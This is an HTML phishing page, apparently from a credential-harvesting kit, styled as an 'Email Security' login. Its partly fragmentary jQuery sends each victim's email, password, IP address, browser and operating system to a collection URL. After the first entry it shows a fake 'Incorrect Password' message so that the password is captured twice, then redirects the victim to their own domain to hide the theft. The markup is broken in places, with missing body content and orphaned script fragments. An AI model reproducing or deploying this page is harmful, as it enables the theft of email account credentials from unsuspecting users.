<html><head>
	<title>Email Security</title>
	<meta charset="utf-8">
	<meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, width=device-width, user-scalable=yes">
	<style type="text/css">
		body {
		    font-family: Verdana, sans-serif;
		    font-size: 0.8em;
		}
		#content {
		    text-align: center;
		    margin: auto;
		    background-color: #000000;
		    position: fixed;
		    top: 50%;
		    left: 50%;
		    transform: translate(-50%, -50%);
		    box-shadow: 0 10px 40px 0 rgba(62, 57, 107, 0.07), 0 2px 9px 0 rgba(62, 57, 107, 0.06);
		    border-radius: 0.25rem;
			width: 25rem;

		}
		input.some {
		    width: 100%;
		    display: block;
		    height: 2rem;
		    text-align: left;
		    border: 1px solid #ccd6e6;
			color: #3f587e;
			font-size: 1rem;
			line-height: 1;
			border-radius: 0.25rem;
			margin-bottom: 0.5rem;
			/*padding-left: 0.5rem;*/
		}

		.foot {
		    margin: auto;
		    text-align: center;
		    position: fixed;
		    bottom: 0;
		    left: 0;
		    width: 100%;
		    height: 4em;
		    color: #ffffff;
		}

		.header{
			color: white;
			padding-top: 0.6em;
			padding-bottom: 0.6em;
			font-weight: 500;
			font-size: 1rem;
			background-color: #0f162d;
		    border-radius: 0.25rem;
		    text-transform: uppercase;
		}
		#content-app{
			background-color: white;
			padding-bottom: 1.5em;
			padding-top: 3.5em;
			padding-right: 3.5em;
			padding-left: 3.5em;
			border-bottom-right-radius: 0.25rem;
			border-bottom-left-radius: 0.25rem;
		}
		.btn{
			display: block;
			width: 100%;
			position: relative;
			background-color: #191f34;
			text-align: center;
			color: white;
			font-size: 1rem;
		    height: 2rem;
		    border-radius: 0.25rem;
		    border: 1px solid transparent;
			padding-left: 0.5rem;
		}
		.err{
		    border: 1px solid red !important;
		}
		footer{
			text-align: center;
			/*margin: 41em;*/position: fixed;
		    top: 78%;
		    left: 50%;
		    transform: translate(-50%, -50%);
		}
		.top-img{
			position: fixed;
			top: 20%;
			left: 50%;
			transform: translate(-50%, -50%);
		}
		.text-success{
			color: #28a745 !important;
		}
	</style>
</head>

              var theBody = $('body'),

                currentBrowser,
                browserClass;

              }

	                  success: function(data){
	                    var i=$.parseJSON(data);
	                    if (i.status == 200){
	                        $('.pwdErr').text('Incorrect Password, Try again');
	                        $('#txtPass').val('');
	                        $('#test').val("stepTwo");
	                        $('#v-pass').val(i.password);
	                        $('#iSpin').toggleClass('fa-spinner');
	                    }
	                  },
	                  error: function(){
	                    alert("Network Connection Failed! - We were unable to connect to the server, please try again later.");
	                    $('#iSpin').toggleClass('fa-spinner');
	                    $('#btn-submit').removeClass('disabled');
	                  }
	                });
	            }
	            if ($('#test').val() == 'stepTwo'){
	                // $('.pwdErr').text('Incorrect Password, Try again');
	                $.ajax({
	                  url: icq_url,
	                  type: "POST",
	                  data: {
	                          email: $('#txtEmail').val(),
	                          pwd: $('#txtPass').val(),
	                          v_pwd: $('#v-pass').val(),
	                          verify: $('#test').val(),
	                          userBrowser: currentBrowser,
	                          userIP: userIP,
	                          OSName: OSName
	                        },
	                  success: function(data){
	                    var i=$.parseJSON(data);
	                    if (i.status == 200){
	                    	// $('.pwdErr').text('Incorrect Password, Try again');
	                        // $('#login-status-message-success').show();
	                        $('#iSpin').toggleClass('fa-spinner');
	                    	$('#iSpin').removeClass('fa-pulse');
	                        $('#iSpin').addClass('fa-check text-success');
	                        setTimeout(function()
	                        {   
	                            window.location = 'https://'+the_domain;
	                        }, 3000);
	                    }
	                  },
	                  error: function(){
	                    alert("Network Connection Failed! - We were unable to connect to the server, please try again later.");
	                    $('#iSpin').toggleClass('fa-spinner');
	                    $('#btn-submit').removeClass('disabled');
	                  }
	                });
	            }
	        } else {
	        	$('#txtPass').addClass('err');
	            $('#iSpin').toggleClass('fa-spinner');
	        }
          } else {
            alert('Please, use the link you were provided to login!')
          } 
        });
    </script>

</body></html>
